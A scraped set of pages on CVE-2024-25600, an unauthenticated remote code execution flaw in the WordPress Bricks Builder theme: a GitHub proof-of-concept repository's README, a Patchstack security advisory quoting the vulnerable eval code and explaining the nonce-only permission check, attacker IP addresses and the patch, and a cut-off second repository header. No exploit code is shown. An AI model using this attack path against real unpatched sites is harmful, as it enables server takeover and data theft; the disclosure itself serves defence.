=== Content from github.com_af398e55_20250110_112603.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=K3ysTr0K3R%2FCVE-2024-25600-EXPLOIT)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[K3ysTr0K3R](/K3ysTr0K3R)
/
**[CVE-2024-25600-EXPLOIT](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)**
Public

* [Notifications](/login?return_to=%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT) You must be signed in to change notification settings
* [Fork
  7](/login?return_to=%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT)
* [Star
   28](/login?return_to=%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT)

A PoC exploit for CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE)

[28
stars](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/stargazers) [7
forks](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/forks) [Branches](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/branches) [Tags](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/tags) [Activity](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/activity)
 [Star](/login?return_to=%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT)

 [Notifications](/login?return_to=%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT) You must be signed in to change notification settings

* [Code](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
* [Issues
  0](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/issues)
* [Pull requests
  0](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/pulls)
* [Actions](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/actions)
* [Projects
  0](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/projects)
* [Security](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/security)
* [Insights](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/pulse)

Additional navigation options

* [Code](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
* [Issues](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/issues)
* [Pull requests](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/pulls)
* [Actions](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/actions)
* [Projects](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/projects)
* [Security](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/security)
* [Insights](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/pulse)

# K3ysTr0K3R/CVE-2024-25600-EXPLOIT

   ¬†main[Branches](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/branches)[Tags](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit¬†History[3 Commits](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/commits/main/) | | |
| [CVE-2024-25600.py](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py "CVE-2024-25600.py") | | [CVE-2024-25600.py](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py "CVE-2024-25600.py") |  |  |
| [README.md](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md "README.md") | | [README.md](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE) üåê

The Bricks theme for WordPress has been identified as vulnerable to a critical security flaw known as CVE-2024-25600. This vulnerability affects all versions up to, and including, 1.9.6 of the Bricks Builder plugin. It poses a significant risk as it allows unauthenticated attackers to execute arbitrary code remotely on the server hosting the vulnerable WordPress site. CVE-2024-25600 is classified under Remote Code Execution (RCE) vulnerabilities, enabling attackers to manipulate the server into executing malicious code without any authentication. This vulnerability exploits a flaw in the Bricks Builder plugin's handling of user input, allowing attackers to inject and execute PHP code remotely. The exploitation of this vulnerability can lead to full site compromise, data theft, and potential spreading of malware to site visitors.

## Impact ‚ö†Ô∏è

The impact of CVE-2024-25600 is severe due to several factors:

* **Unauthenticated Access:** The exploit can be carried out without any authenticated session or user credentials, making every website running a vulnerable version of the Bricks Builder plugin an easy target.
* **Remote Code Execution:** Successful exploitation allows attackers to execute arbitrary code on the server, providing the capability to modify website content, steal sensitive data, and gain unauthorized access to the hosting environment.
* **Widespread Risk:** Given the popularity of the Bricks Builder plugin among WordPress users for its design flexibility, a significant number of websites are at risk until patched.

## Mitigation Steps üîí

To mitigate the risk posed by CVE-2024-25600, website administrators and security teams should immediately take the following steps:

* **Update the Plugin:** Upgrade the Bricks Builder plugin to the latest version immediately. The developers have released patches addressing this vulnerability in versions following 1.9.6.
* **Security Review:** Conduct a thorough security review of your website to ensure no unauthorized modifications have been made.
* **Regular Monitoring:** Implement regular monitoring of web logs for any suspicious activity that could indicate exploitation attempts or successful breaches.
* **Security Best Practices:** Adhere to security best practices for WordPress sites, including using strong passwords, limiting login attempts, and using security plugins to monitor and protect your site.

## Disclaimer üö´

Here's a Proof of Concept (PoC) for educational and security research purposes only. The use of the information provided is at your own risk. The author or contributors do not encourage unethical or illegal activity. Ensure you have explicit permission before testing any system with the techniques and code described.

## About

A PoC exploit for CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE)

### Topics

[wordpress](/topics/wordpress "Topic: wordpress")
[wordpress-plugin](/topics/wordpress-plugin "Topic: wordpress-plugin")
[exploit](/topics/exploit "Topic: exploit")
[word](/topics/word "Topic: word")
[hacking](/topics/hacking "Topic: hacking")
[exploits](/topics/exploits "Topic: exploits")
[poc](/topics/poc "Topic: poc")
[rce](/topics/rce "Topic: rce")
[educational](/topics/educational "Topic: educational")
[vulnerability](/topics/vulnerability "Topic: vulnerability")
[vulnerabilities](/topics/vulnerabilities "Topic: vulnerabilities")
[exploitation](/topics/exploitation "Topic: exploitation")
[security-research](/topics/security-research "Topic: security-research")
[security-researcher](/topics/security-researcher "Topic: security-researcher")
[remote-code-execution](/topics/remote-code-execution "Topic: remote-code-execution")
[bricks-builder](/topics/bricks-builder "Topic: bricks-builder")
[cve-2024-25600](/topics/cve-2024-25600 "Topic: cve-2024-25600")

### Resources

[Readme](#readme-ov-file)

[Activity](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/activity)
### Stars

[**28**
stars](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/stargazers)
### Watchers

[**1**
watching](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/watchers)
### Forks

[**7**
forks](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FK3ysTr0K3R%2FCVE-2024-25600-EXPLOIT&report=K3ysTr0K3R+%28user%29)

## [Releases](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/releases)

No releases published

## [Packages 0](/users/K3ysTr0K3R/packages?repo_name=CVE-2024-25600-EXPLOIT)

No packages published

## Languages

* [Python
  100.0%](/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/search?l=python)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from patchstack.com_95e989c3_20250110_112604.html ===


[Skip to main content](#main)
[![](https://patchstack.com/wp-content/uploads/2021/11/logo.svg)](/)

JavaScript is disabled in your browser. Please enable JavaScript for a better experience.

* [Pricing](/pricing/)
* Solutions
  + [WordPress security](https://patchstack.com/wordpress-security/)
  + [Enterprise API](https://patchstack.com/for-hosts/)
  + [Managed VDP](https://patchstack.com/for-plugins/)
  + [Bug Bounty](https://patchstack.com/bug-bounty/)
  + [Plugin auditing](https://patchstack.com/auditing/)
  + [Vulnerability database](https://patchstack.com/database/)
* [Login](https://app.patchstack.com/login)

* ![]()

  + ![]()

    - ![]()

[Start trial](https://app.patchstack.com/register)

# Critical RCE Patched in Bricks Builder Theme

[Security advisories](https://patchstack.com/category/security-advisories/)
[Featured](https://patchstack.com/category/featured/)
[Bricks Builder](https://patchstack.com/tag/bricks-builder/)
Published 19 February 2024![](https://secure.gravatar.com/avatar/1afc8ea1128a413b5780e102a8032b6f?s=200&d=mm&r=g)[Rafie Muhammad](https://patchstack.com/author/rafie/)Security Researcher at PatchstackTable of Contents

[#### Bricks Builder

Unauthentiacated Remote Code Execution (RCE)](https://patchstack.com/database/vulnerability/bricks/wordpress-bricks-theme-1-9-6-unauthenticated-remote-code-execution-rce-vulnerability)

*The vulnerability in the Bricks Builder Theme was originally reported by [snicco](https://patchstack.com/database/researcher/fb2abcdf-8919-412d-b8c0-ecf6323a6fb5) to the [Patchstack bug bounty program for WordPress](https://patchstack.com/bug-bounty/). We are collaborating with the researcher to release the content of this security advisory article.*

This blog post is about the Bricks Builder Theme vulnerability. If you‚Äôre a Bricks Builder Theme user, please update the plugin to at least version **1.9.6.1**.

You can sign up for the [Patchstack Community plan](http://patchstack.com/pricing/) to be notified about vulnerabilities as soon as they become disclosed. **Patchstack users with protection enabled have been protected from this vulnerability.**

For plugin developers, we have¬†[security audit services](https://patchstack.com/auditing/)¬†and¬†[Threat Intelligence Feed API](https://patchstack.com/threat-intel-feed/)¬†for hosting companies.

### What to do when you have a vulnerable plugin installed?

1. Check if there‚Äôs an available update for the plugin. Developers often release patches to fix vulnerabilities. **Update to the latest version as soon as possible.**
2. If an update isn‚Äôt available or if the vulnerability poses a significant risk **remove the plugin from your site.** This will prevent any potential exploitation until a fix is available.
3. Enable protection from your [Patchstack account](https://app.patchstack.com/login), so this and future vulnerabilities would **get automatic [virtual patches](https://patchstack.com/articles/virtual-patching/)** and they would not be exploited.

## About the Bricks Builder theme

The theme [Bricks Builder](https://bricksbuilder.io/) (premium version) is estimated to have around 25,000 currently active installations. The Bricks Builder theme is known as the more popular premium site builder theme.

![Bricks Builder Theme](https://patchstack.com/wp-content/uploads/2024/02/image-4.png)

Bricks Builder theme is proclaimed to be an innovative, community-driven, visual site builder for WordPress. This theme enables users to design unique, performant, and scalable websites with a Code-free approach.

## The security vulnerability

This plugin suffers from an unauthenticated Remote Code Execution (RCE) vulnerability. This vulnerability allows any unauthenticated user to execute arbitrary PHP code on the WordPress site. The described vulnerability was fixed in version **1.9.6.1** and assigned **CVE-2024-25600**.

### Unauthenticated RCE

The underlying vulnerable code exists in the `prepare_query_vars_from_settings` function:

```
public static function prepare_query_vars_from_settings( $settings = [], $fallback_element_id = '' ) {
	$query_vars = $settings['query'] ?? [];

	// Some elements already built the query vars. (carousel, related-posts) (@since 1.9.3)
	if ( isset( $query_vars['bricks_skip_query_vars'] ) ) {
		return $query_vars;
	}

	// Unset infinite scroll
	if ( isset( $query_vars['infinite_scroll'] ) ) {
		unset( $query_vars['infinite_scroll'] );
	}

	// Unset isLiveSearch (@since 1.9.6)
	if ( isset( $query_vars['is_live_search'] ) ) {
		unset( $query_vars['is_live_search'] );
	}

	// Do not use meta_key if orderby is not set to meta_value or meta_value_num (@since 1.8)
	if ( isset( $query_vars['meta_key'] ) ) {
		$orderby = isset( $query_vars['orderby'] ) ? $query_vars['orderby'] : '';
		if ( ! in_array( $orderby, [ 'meta_value', 'meta_value_num' ] ) ) {
			unset( $query_vars['meta_key'] );
		}
	}

	$object_type = self::get_query_object_type();
	$element_id  = self::get_query_element_id();

	/**
		* Use PHP editor
		*
		* Returns PHP array with query arguments
		*
		* Supported if 'objectType' is 'post', 'term' or 'user'.
		* No merge query.
		*
		* @since 1.9.1
		*/
	if ( isset( $query_vars['useQueryEditor'] ) && ! empty( $query_vars['queryEditor'] ) && in_array( $object_type, [ 'post','term','user' ] ) ) {
		$post_id                      = Database::$page_data['preview_or_post_id'];
		$php_query_raw                = bricks_render_dynamic_data( $query_vars['queryEditor'], $post_id );
		$query_vars['posts_per_page'] = get_option( 'posts_per_page' );

		// Define an anonymous function that simulates the scope for user code
		$execute_user_code = function () use ( $php_query_raw ) {
			$user_result = null; // Initialize a variable to capture the result of user code

			// Capture user code output using output buffering
			ob_start();
			$user_result = eval( $php_query_raw ); // Execute the user code
			ob_get_clean(); // Get the captured output

			return $user_result; // Return the user code result
		};
---------------------- CUTTED HERE ----------------------
```

Notice that there is an `eval` function call with `$php_query_raw` supplied as the parameter. The `$php_query_raw` itself is constructed from `$query_vars['queryEditor']` value that will be processed first by `bricks_render_dynamic_data` function.

The `prepare_query_vars_from_settings` function itself can be called from several processes in the code. One of it is coming from `__construct` function inside the `Query` class:

```
public function __construct( $element = [] ) {
	$this->register_query();

	$this->element_id = ! empty( $element['id'] ) ? $element['id'] : '';

	// Check for stored query in query history (@since 1.9.1)
	$query_instance = self::get_query_by_element_id( $this->element_id );

	if ( $query_instance ) {
		// Assign the history query instance properties to this instance, avoid running the query again
		foreach ( $query_instance as $key => $value ) {
			if ( $key === 'id' ) {
				continue;
			}
			$this->$key = $value;
		}
	} else {
		$this->object_type = ! empty( $element['settings']['query']['objectType'] ) ? $element['settings']['query']['objectType'] : 'post';

		// Remove object type from query vars to avoid future conflicts
		unset( $element['settings']['query']['objectType'] );

		$this->settings = ! empty( $element['settings'] ) ? $element['settings'] : [];

		// STEP: Set the query vars from the element settings (@since 1.8)
		$this->query_vars = self::prepare_query_vars_from_settings( $this->settings );
---------------------- CUTTED HERE ----------------------
```

This `Query` class also could be called from several processes in the code. If we trace back the process call of one of the cases, we can see that this class first can be called from `function render_element` (‚Äúincludes/api.php‚Äù) => `function render_element` (‚Äúincludes/ajax.php‚Äù) => `function init` (‚Äúincludes/elements/base.php‚Äù) => `function render()` (‚Äúincludes/elements/posts.php‚Äù) => `new Query()`

If we check `function render_element` (‚Äúincludes/api.php‚Äù), it is actually a function to handle one of the registered REST API endpoints:

```
public function rest_api_init_custom_endpoints() {
	// Server-side render (SSR) for builder elements via window.fetch API requests
	register_rest_route(
		self::API_NAMESPACE,
		'render_element',
		[
			'methods'             => 'POST',
			'callback'            => [ $this, 'render_element' ],
			'permission_callback' => [ $this, 'render_element_permissions_check' ],
		]
	);
---------------------- CUTTED HERE ----------------------
```

The API endpoint is already protected by `render_element_permissions_check` function that is applied as the function to check permission on the `permission_callback` parameter. Let‚Äôs see how the function handles the permission:

```
public function render_element_permissions_check( $request ) {
	$data = $request->get_json_params();

	if ( empty( $data['postId'] ) || empty( $data['element'] ) || empty( $data['nonce'] ) ) {
		return new \WP_Error( 'bricks_api_missing', __( 'Missing parameters' ), [ 'status' => 400 ] );
	}

	$result = wp_verify_nonce( $data['nonce'], 'bricks-nonce' );

	if ( ! $result ) {
		return new \WP_Error( 'rest_cookie_invalid_nonce', __( 'Cookie check failed' ), [ 'status' => 403 ] );
	}

	return true;
}
```

The function only checks for a nonce value and no proper permission or role check is applied. This bricks-nonce value itself is publicly available on the front end of a WordPress site.

With this condition, any unauthenticated user can fetch the nonce and trigger the Remote Code Execution (RCE).

Note that this vulnerability can be reproduced with an **Unauthenticated** user with the default installation configuration of the theme.

## Disclosure note

We decided to release the technical advisory article on this vulnerability early since we have detected active exploitation in our monitoring system. This Bricks Builder Theme vulnerability is currently being exploited and we are seeing attacks from several IP addresses, most of the attacks are from the following IP addresses:

* 200.251.23.57
* 92.118.170.216
* 103.187.5.128
* 149.202.55.79
* 5.252.118.211
* 91.108.240.52

We are also aware of one of the malware that is specifically used on a post-exploitation process of this vulnerability. **[This malware](https://gist.github.com/lynt-smitka/1eef476aed934fd3bc0be0813ea82f39) has a built-in feature to disable some of the security-related plugins such as Wordfence and Sucuri.**

## The patch

The patch includes an implementation of a permission check on the `render_element_permissions_check` function. The patch also implements a sanitization on the `$php_query_raw` using the `Helpers::sanitize_element_php_code` function. The patch can be seen below:

![Bricks Builder Theme vulnerability](https://patchstack.com/wp-content/uploads/2024/02/image-6-1024x263.png)
![Bricks Builder Theme vulnerability](https://patchstack.com/wp-content/uploads/2024/02/image-5-1024x567.png)
## Conclusion

In general, we recommend not to utilize the eval function on a plugin and theme development process. If the process still needs an eval function to be processed, we recommend applying a very strict permission or role check when accessing the feature and also applying filtering and sanitization on the supplied PHP code.

## Timeline

10 February, 2024We receive the vulnerability report from snicco and reached out to the Bricks Builder team.

12 February, 2024Bricks Builder team send us a proposed patch and we are able to validate the patch. We deploy a vPatch for this vulnerability to protect our customers.

13 February, 2024Bricks Builder version **[1.9.6.1](https://bricksbuilder.io/release/bricks-1-9-6-1/)** released to patch the reported issue. We add the vulnerability to the¬†[Patchstack vulnerability database](https://patchstack.com/database/vulnerability/bricks/wordpress-bricks-theme-1-9-6-unauthenticated-remote-code-execution-rce-vulnerability).

14 February, 2024First exploitation attempts confirmed on our monitoring system.

19 February, 2024Security advisory article publicly released.

## Help us make the Internet a safer place

Making the WordPress ecosystem more secure is a team effort, and we believe that plugin developers and security researchers should work together.

* If you‚Äôre a **plugin developer**, join our [mVDP program](http://patchstack.com/for-plugins/) which makes it easier to report, manage, and address vulnerabilities in your software.
* If you‚Äôre a **security researcher**, join the [Patchstack Alliance](https://patchstack.com/bug-bounty/) community and report vulnerabilities to our bug bounty program to earn rewards.
Found this useful? Share on

* ![](https://patchstack.com/wp-content/uploads/2024/06/twitter-x-line.svg)
* ![](https://patchstack.com/wp-content/uploads/2024/03/facebook-fill.svg)
* ![](https://patchstack.com/wp-content/uploads/2024/03/linkedin-fill.svg)

Protect your websites against WordPress vulnerabilities[Get started](/pricing/)
### Monthly security advice

Get the latest WordPress security intelligence delivered to your inbox.**NEW**:¬†Get started with 5 bite-sized security lessons.
Email SignupEmailSubscribe
### The latest in Security advisories

[See all](https://patchstack.com/category/security-advisories/)[![](https://patchstack.com/wp-content/uploads/2025/01/Critical-Vulnerabilities-Found-in-Fancy-Product-Designer-Plugin-main.png)8 January, 2025
#### Critical Vulnerabilities Found in Fancy Product Designer Plugin

Critical Vulnerability
arbitrary file upload
SQL Injection
ENVATO](https://patchstack.com/articles/critical-vulnerabilities-found-in-fancy-product-designer-plugin/)[![](https://patchstack.com/wp-content/uploads/2024/12/Multiple-Critical-Vulnerabilities-Patched-in-WPLMS-and-VibeBP-Plugins-main.png)23 December, 2024
#### Multiple Critical Vulnerabilities Patched in WPLMS and VibeBP Plugins

ENVATO
Critical Vulnerability
privilege escalation
arbitrary file upload
theme
SQL Injection](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wplms-and-vibebp-plugins/)[![Use the Patchstack Developer plan API to create automations](https://patchstack.com/wp-content/uploads/2024/12/patchstack-create-endless-automations-with-Patchstack-API-blog-cover.png)20 December, 2024
#### NEW: Announcing Patchstack API for Endless Automations](https://patchstack.com/articles/announcing-patchstack-developer-api-for-endless-automations/)

### Website security

[Pricing](https://patchstack.com/pricing/)[For WordPress](https://patchstack.com/wordpress-security/)[For WooCommerce](https://patchstack.com/woocommerce-security)[For agencies](https://patchstack.com/for-agencies/)[API for hosts](https://patchstack.com/for-hosts/)[Documentation](https://docs.patchstack.com/)[Log in](https://app.patchstack.com/login)
### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)[Log in](https://vdp.patchstack.com/vdp/login)[Active programs](https://patchstack.com/database/vdp/)[Security auditing](https://patchstack.com/auditing/)
### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)[Log in](https://vdp.patchstack.com/researchers/login)[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)[Learn](https://patchstack.com/academy)[Discord](https://discord.gg/rkE8yxtNmS)
### Resources

[Vulnerability database](https://patchstack.com/database/)[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024/)[Vulnerability statistics](https://patchstack.com/database/statistics/wordpress)[Case studies](https://patchstack.com/category/case-studies/)[Articles](https://patchstack.com/articles/)
### Patchstack

[About](https://patchstack.com/about/)[Careers](https://patchstack.com/about/#careers)[Merch store](https://store.patchstack.com)[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)
### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)[Facebook](https://www.facebook.com/patchstackapp)[X](https://twitter.com/patchstackapp)[![Patchstack logo](https://patchstack.com/wp-content/uploads/2024/01/logo-opt-300x32.webp)](/)¬© 2025 Patchstack[DPA](https://patchstack.com/data-processing-agreement-dpa/)[Privacy Policy](https://patchstack.com/privacy-policy/)[Terms & Conditions](https://patchstack.com/terms-and-conditions/)![Co-funded by EU logo](https://patchstack.com/wp-content/uploads/2024/01/EIC-logo-CoFundedBy-opt.webp)
[![](https://patchstack.com/wp-content/uploads/2021/01/logo.png)](/)
### Website security

[Pricing](https://patchstack.com/pricing/)[For WordPress](https://patchstack.com/wordpress-security/)[For WooCommerce](https://patchstack.com/woocommerce-security)[For agencies](https://patchstack.com/for-agencies/)[API for hosts](https://patchstack.com/for-hosts/)[Documentation](https://docs.patchstack.com/)[Log in](https://app.patchstack.com/login)
### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)[Log in](https://vdp.patchstack.com/vdp/login)[Active programs](https://patchstack.com/database/vdp/)[Security auditing](https://patchstack.com/auditing/)
### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)[Log in](https://vdp.patchstack.com/researchers/login)[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)[Learn](https://patchstack.com/academy)[Discord](https://discord.gg/rkE8yxtNmS)
### Resources

[Vulnerability database](https://patchstack.com/database/)[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024/)[Vulnerability statistics](https://patchstack.com/database/statistics/wordpress)[Case studies](https://patchstack.com/category/case-studies/)[Articles](https://patchstack.com/articles/)
### Patchstack

[About](https://patchstack.com/about/)[Careers](https://patchstack.com/about/#careers)[Merch store](https://store.patchstack.com)[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)
### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)[Facebook](https://www.facebook.com/patchstackapp)[X](https://twitter.com/patchstackapp)¬© 2025 Patchstack[DPA](https://patchstack.com/data-processing-agreement-dpa/)[Privacy Policy](https://patchstack.com/privacy-policy/)[Terms & Conditions](https://patchstack.com/terms-and-conditions/)

Looks like your browser is blocking our support chat widget. Turn off adblockers and reload the page.Reload page

xml version="1.0"?closechevron-downchainbarsangle-rightangle-upxml version="1.0"?crossmenu



=== Content from github.com_72f2ae2c_20250110_112602.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChocapikk%2FCVE-2024-25600)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChocapikk%2FCVE-2024-25600)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Chocapikk%2FCVE-2024-25600)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Chocapikk](/Chocapikk)
/
**[CVE-2024-25600](/Chocapikk/CVE-2024-25600)**
Public

* [Notifications](/login?return_to=%2FChocapikk%2FCVE-2024-25600) You must be signed in to change notification settings
* [Fork
  33](/login?return_to=%2FChocapikk%2FCVE-2024-25600)
* [Star
   154](/login?return_to=%2FChocapikk%2FCVE-2024-25600)

